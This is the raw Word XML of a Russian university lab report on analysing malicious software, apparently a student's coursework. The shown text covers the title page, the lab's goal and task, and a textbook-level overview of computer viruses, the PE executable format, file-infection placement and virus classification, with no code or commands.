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7B85" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="006A0481" w:rsidRDefault="00C53ADA" w:rsidP="004D6D91">
      <w:pPr>
        <w:pStyle w:val="afff6"/>
      </w:pPr>
      <w:r w:rsidRPr="006A0481">
        <w:t>Министерство образования и науки Российской Федерации</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02039B20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 xml:space="preserve">Санкт-Петербургский </w:t>
      </w:r>
      <w:r w:rsidR="00C6615B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>П</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">олитехнический </w:t>
      </w:r>
      <w:r w:rsidR="00C6615B">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>У</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>ниверситет</w:t>
      </w:r>
      <w:r w:rsidR="00FF6364" w:rsidRPr="00FF6364">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> Петра Великого</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F62CD33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>—</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C670EAB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 xml:space="preserve">Институт </w:t>
      </w:r>
      <w:r w:rsidR="006E2B77">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>кибербезопасности и защиты информации</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48AAB19A" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00D335CB">
      <w:pPr>
        <w:pStyle w:val="afffd"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="576C47F8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7011EBED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7A94E672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D598D4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F8E1CB0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79EF4661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6B6BEB26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6291102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07E4B7A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58224150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5308A88" w14:textId="53144DB8" w:rsidR="002632D6" w:rsidRPr="00E3112B" w:rsidRDefault="002632D6" w:rsidP="002632D6">
      <w:pPr>
        <w:pStyle w:val="afff3"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:caps/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00D335CB">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t xml:space="preserve">ЛАБОРАТОРНАЯ РАБОТА № </w:t>
      </w:r>
      <w:r w:rsidR="0029734A" w:rsidRPr="00E3112B">
        <w:rPr>
          <w:lang w:val="ru-RU"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="223F4F89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71DB0339" w14:textId="495FCC23" w:rsidR="00601F8B" w:rsidRPr="00601F8B" w:rsidRDefault="00FB359E" w:rsidP="004D6D91">
      <w:pPr>
        <w:pStyle w:val="afff5"/>
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="006A0481">
        <w:t>«</w:t>
      </w:r>
      <w:r w:rsidR="0029734A">
        <w:t>Анализ вредоносных программных средств</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A179458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75A2F0DF" w14:textId="572D7C11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29734A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Основы информационной безопасности</w:t>
      </w:r>
      <w:r w:rsidRPr="006A0481">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>»</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06FF936D" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="15C76C2E" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="1E8DE14D" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="4409107A" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00111FF9">
      <w:pPr>
        <w:ind w:firstLine="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AC9F96E" w14:textId="77777777" w:rsidR="00830F2D" w:rsidRDefault="00830F2D" w:rsidP="00C53ADA"/>
    <w:p w14:paraId="2172B406" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00B57B60">
        <w:t>Выполнил</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="48711376" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00961BBB" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
      </w:pPr>
      <w:r>
        <w:t>студент гр.</w:t>
      </w:r>
      <w:r w:rsidRPr="003F274E">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>4851004</w:t>
      </w:r>
      <w:r w:rsidR="003F274E" w:rsidRPr="003F274E">
        <w:t>/</w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>10001</w:t>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve">                                                          </w:t>
      </w:r>
      <w:r w:rsidR="003F274E">
        <w:t>Веремейчук Я.Ю.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35046212" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00025991">
      <w:pPr>
        <w:pStyle w:val="41"/>
      </w:pPr>
      <w:r w:rsidRPr="00B57B60">
        <w:t>&lt;подпись&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04331BF8" w14:textId="77777777" w:rsidR="000F71FD" w:rsidRDefault="000F71FD" w:rsidP="003C218B">
      <w:pPr>
        <w:pStyle w:val="af6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37C49AE3" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="000F71FD" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>Преподаватель</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C76CD3C" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C93DCC" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r w:rsidRPr="00C93DCC">
        <w:t>асс. преподавателя</w:t>
      </w:r>
      <w:r w:rsidR="00C53ADA" w:rsidRPr="00B57B60">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve">                                                              </w:t>
      </w:r>
      <w:r w:rsidR="00C53ADA" w:rsidRPr="00B57B60">
        <w:tab/>
      </w:r>
      <w:r w:rsidR="00111FF9">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="006E2B77" w:rsidRPr="00111FF9">
        <w:t xml:space="preserve">Панков </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="006E2B77" w:rsidRPr="00111FF9">
        <w:t>И.Д.</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="44AC374F" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="00025991">
      <w:pPr>
        <w:pStyle w:val="41"/>
      </w:pPr>
      <w:r w:rsidRPr="00C53ADA">
        <w:t>&lt;подпись&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DD2BA9A" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRPr="00B57B60" w:rsidRDefault="00C53ADA" w:rsidP="00C53ADA">
      <w:pPr>
        <w:pStyle w:val="af6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384D64D0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0C214241" w14:textId="77777777" w:rsidR="00C53ADA" w:rsidRDefault="00C53ADA" w:rsidP="0002599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72F75E0C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16DFF988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2974A3F5" w14:textId="3B240997" w:rsidR="00C93DCC" w:rsidRPr="00111FF9" w:rsidRDefault="00C53ADA" w:rsidP="00111FF9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20</w:t>
      </w:r>
      <w:r w:rsidR="003F274E" w:rsidRPr="003F274E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidR="0029734A">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AC2C7C4" w14:textId="77777777" w:rsidR="00601F8B" w:rsidRPr="00D740EB" w:rsidRDefault="00C93DCC" w:rsidP="00111FF9">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r w:rsidRPr="00D740EB">
        <w:lastRenderedPageBreak/>
        <w:t>Цель работы</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A2F83A6" w14:textId="3E2CE31C" w:rsidR="00C93DCC" w:rsidRDefault="00E3112B" w:rsidP="004E5FC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Приобретение практических навыков по противодействию вредоносным программным средствам на примере компьютерных вирусов.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BDA727D" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4666F090" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Постановка задачи</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7627A544" w14:textId="19C6C031" w:rsidR="00C93DCC" w:rsidRDefault="00E3112B" w:rsidP="004E5FC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Изучить принцип работы генераторов вирусов, </w:t>
      </w:r>
      <w:r w:rsidR="00A62E9E">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>сгенерировать вирусы, запустить их и исследовать код зараженных программ.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69FC238D" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:suppressAutoHyphens/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="08ECD030" w14:textId="77777777" w:rsidR="00C93DCC" w:rsidRPr="00C93DCC" w:rsidRDefault="00C93DCC" w:rsidP="004E5FC2">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Теоретические исследования</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7307404F" w14:textId="77777777" w:rsidR="00481B9B" w:rsidRDefault="00A62E9E" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r>
        <w:t>Компьютерный вирус – программа, которая может заражать другие программы, модифицируя их посредством добавления своей, возможно измененной, копии. Заражая программы, вирус распространяется в компьютерной системе или сети, используя системные пли пользовательские полномочия. Зараженная программа также действует как вирус, что способствует быстрому инфицированию.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2544B244" w14:textId="3E77DF2B" w:rsidR="00A62E9E" w:rsidRPr="001048A6" w:rsidRDefault="002C0D96" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Наиболее часто заражаемые – файлы формата </w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:rPr>
          <w:color w:val="000000"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EXE</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EXE</w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:t xml:space="preserve">-файлы появились еще в системе MSDOS, затем с небольшими изменениями были перенесены в системы Windows. </w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>EXE</w:t>
      </w:r>
      <w:r w:rsidR="00481B9B">
        <w:t xml:space="preserve">-файлы содержат несколько программных сегментов, включая сегмент кода CS, сегмент данных DS и сегмент стека SS. Файл типа ЕХЕ содержит информацию для загрузчика для инициализации программы. Формат ЕХЕ-файла для системы Windows называется РЕ (переносимый исполняемый, Portable </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00481B9B">
        <w:t>Executable</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00481B9B">
        <w:t xml:space="preserve">), что показывает независимость исполняемого файла от архитектуры процессора. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidR="00481B9B">
        <w:t>РЕ-формат</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidR="00481B9B">
        <w:t xml:space="preserve"> включает заголовки, содержащие описание свойств файла и его структуры. Секции исполняемого файла содержат информацию, размещаемую в адресном пространстве процесса при загрузке файла в память.</w:t>
      </w:r>
      <w:r w:rsidR="001048A6">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="001048A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>DOS</w:t>
      </w:r>
      <w:r w:rsidR="001048A6" w:rsidRPr="001048A6">
        <w:t>-</w:t>
      </w:r>
      <w:r w:rsidR="001048A6">
        <w:t xml:space="preserve">заголовок включен в файл </w:t>
      </w:r>
      <w:r w:rsidR="001048A6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>PE</w:t>
      </w:r>
      <w:r w:rsidR="001048A6">
        <w:t>-формата для поддержания совместимости со старыми версиями операционной системы.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75BD4671" w14:textId="77777777" w:rsidR="002C0D96" w:rsidRDefault="002C0D96" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Однозначно идентифицирует вирус его сигнатура – характерная информационная последовательность. Выявление таких участков в коде программы до сих пор является основным способом обнаружения вирусов. Обычно файловый вирус дописывается к заражаемому файлу. При внедрении вируса в середину файла он может скопировать свой код в таблицу настройки адресов, в область стека (при этом размер зараженного файла не меняется, что затрудняет обнаружение вируса). Вирус может «раздвинуть» файл или переписать часть программы в конец файла, а свой код – на освободившееся место. При внедрении в начало файла вирус либо переписывает начало заражаемого файла в конец, а сам копируется в освободившееся место, либо создает в оперативной памяти свою копию, дописывает к ней заражаемый файл и сбрасывает новый образ файла на диск.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B5100E1" w14:textId="7852A798" w:rsidR="002C0D96" w:rsidRDefault="002C0D96" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Существуют вирусы, которые записывают себя поверх заражаемого кода. Они не передают управление программе, так как её код разрушен перезаписью. Программы, зараженные такими вирусами, неизлечимы. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="783B86E0" w14:textId="0A9FFD15" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:ind w:left="23" w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>В настоящее время не существует единой системы классификации и именования вирусов</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:t>Принято разделять вирусы:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EB23264" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>по поражаемым объектам (</w:t>
      </w:r>
      <w:hyperlink r:id="rId8" w:tooltip="Файловый вирус" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>файловые вирусы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId9" w:tooltip="Загрузочный вирус" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>загрузочные вирусы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, сценарные вирусы, </w:t>
      </w:r>
      <w:hyperlink r:id="rId10" w:tooltip="Макровирусы" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>макровирусы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, вирусы, поражающие исходный код);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3543F946" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>файловые вирусы делят по механизму заражения: паразитирующие добавляют себя в исполняемый файл, перезаписывающие невосстановимо портят заражённый файл, «спутники» идут отдельным файлом.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0BBECF32" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>по поражаемым операционным системам и платформам (</w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tooltip="DOS" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>DOS</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:tooltip="Windows" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>Windows</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tooltip="Unix" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>Unix</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tooltip="Linux" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>Linux</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/Android" \o "Android" </w:instrText>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>Android</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004E373D">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="321F5FB2" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>по используемым технологиям (</w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tooltip="Полиморфный вирус" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>полиморфные вирусы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tooltip="Стелс-вирус" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>стелс-вирусы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:tooltip="Руткит" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>руткиты</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78A701C8" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:lastRenderedPageBreak/>
        <w:t>по языку, на котором написан вирус (</w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:tooltip="Язык ассемблера" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>ассемблер</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tooltip="Высокоуровневый язык программирования" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>высокоуровневый язык программирования</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:tooltip="Сценарный язык" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>сценарный язык</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t> и др.);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39FC58DB" w14:textId="77777777" w:rsidR="00CC7237" w:rsidRPr="00CC7237" w:rsidRDefault="00CC7237" w:rsidP="004E5FC2">
      <w:pPr>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="31"/>
        </w:numPr>
        <w:ind w:right="4"/>
      </w:pPr>
      <w:r w:rsidRPr="00CC7237">
        <w:t>по дополнительной вредоносной функциональности (</w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:tooltip="Бэкдор" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>бэкдоры</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/%D0%9A%D0%B5%D0%B9%D0%BB%D0%BE%D0%B3%D0%B3%D0%B5%D1%80" \o "Кейлоггер" </w:instrText>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>кейлоггеры</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004E373D">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId22" w:tooltip="Spyware" w:history="1">
        <w:r w:rsidRPr="00CC7237">
          <w:rPr>
            <w:rStyle w:val="aff5"/>
            <w:color w:val="auto"/>
            <w:u w:val="none"/>
          </w:rPr>
          <w:t>шпионы</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00CC7237">
        <w:t>, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:instrText xml:space="preserve"> HYPERLINK "https://ru.wikipedia.org/wiki/%D0%91%D0%BE%D1%82%D0%BD%D0%B5%D1%82" \o "Ботнет" </w:instrText>
      </w:r>
      <w:r w:rsidR="004E373D">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:t>ботнеты</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="004E373D">
        <w:rPr>
          <w:rStyle w:val="aff5"/>
          <w:color w:val="auto"/>
          <w:u w:val="none"/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r w:rsidRPr="00CC7237">
        <w:t> и др.).</w:t>
      </w:r>
    </w:p>
